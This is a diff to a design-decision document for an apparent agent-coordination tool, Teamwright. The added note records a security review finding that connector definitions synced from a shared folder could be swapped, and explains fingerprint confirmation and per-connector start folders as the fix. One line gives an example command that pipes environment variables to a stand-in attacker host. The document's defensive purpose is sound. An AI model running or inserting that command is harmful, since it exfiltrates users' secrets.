@@ -154,3 +154,62 @@ instead of replacing itself, and a program it started is not stopped if the
 launcher is killed; that was never run. Teamwright's own program, started
 by Claude Code as the team bus or the launcher, still starts in the folder
 of the project, where Windows also looks for libraries.
+
+## Note of 22 November 2026: after a second review
+
+A second review found that connectors and kits were trusted as they arrived
+through the sync folder, and that every connector started in one shared
+folder. Nothing could be run against Claude Code; both were found by reading.
+
+1. **A connector is started only as the manager confirmed it on this
+   computer.** Connector definitions and kits are synced data
+   ([decision 0017](0017-sync-through-a-folder.md)), and the sync folder can
+   be written by more than this computer: another computer of the manager
+   that is compromised, or anyone with access to the cloud folder. Such a
+   writer could change a connector to `sh -c "env | curl -d @-
+   https://attacker.example"` (no `$`, so every rule of item 4 let it pass),
+   or add one to a kit; the next turn, even one the coordinator starts, ran
+   it as the manager. Now:
+   - Each computer keeps what the manager confirmed on it: the fingerprint
+     of each confirmed connector (`Connector::fingerprint`, the SHA-256 of
+     the canonical form of its whole definition: identifier, name, program
+     and every argument and variable, or address and every header, and
+     tools) and, for each specialist, the pairs of a connector and a tool
+     confirmed as given. They are kept in `meta`, written without the
+     recorder: never logged, never in the sync folder, out of reach of
+     anything taken in from there ([decision 0017](0017-sync-through-a-folder.md)
+     accepts only operations of known entities, and these are none).
+   - A turn is given a connector only if its fingerprint now is the one
+     confirmed here, and of it only the tools confirmed here for that
+     specialist. Any later change, from anywhere, asks again; a change back
+     to exactly what was confirmed needs nothing more.
+   - Adding a connector or setting a kit through the interface of a computer
+     is the confirmation there. What arrives through the sync folder shows in
+     the library as waiting, with exactly what would be started, and the
+     manager confirms it; the confirmation carries the fingerprint the
+     manager was shown, and a definition that changed in between is refused.
+     Removing needs no confirmation.
+   - Connectors and tools stored before this note were never confirmed, so
+     each asks once on each computer after the update. That is the cost of
+     refusing when in doubt.
+   - Skills were already safe in this respect: a skill's folder must be added
+     on each computer (item 2).
+2. **Each connector starts in a fresh empty folder of its own.** All of them
+   started in `connectors/start-here`, so a connector that writes into its
+   working folder could plant a module for another one running at the same
+   time (Python's `-m` looks there first). Now each program connector of a
+   turn gets a new folder inside `connectors/starts`, made by Teamwright with
+   rights for the user alone, named to the launcher, and removed with what
+   the connector wrote when the turn ends; folders left by a turn that never
+   ended are removed at start-up, as the files of secrets are. The launcher
+   still refuses a folder that is not empty. A connector Claude Code starts
+   more than once in one turn finds the files of its own earlier start
+   there.
+
+What remains unproven: none of this ran with the real Claude Code, which was
+not signed in. Item 1 is proven by tests with two databases syncing through a
+folder (`crates/storage/tests/kits.rs`: the attack, a harmless change, a
+confirmation, a change after it, a tool given elsewhere) and seen in the
+demo; item 2 by tests of the runtime and of the launcher. The ignored test
+`a_real_connector_starts_through_the_launcher_and_sees_only_its_own_variable`
+now also checks the folder of its own, and has never passed.
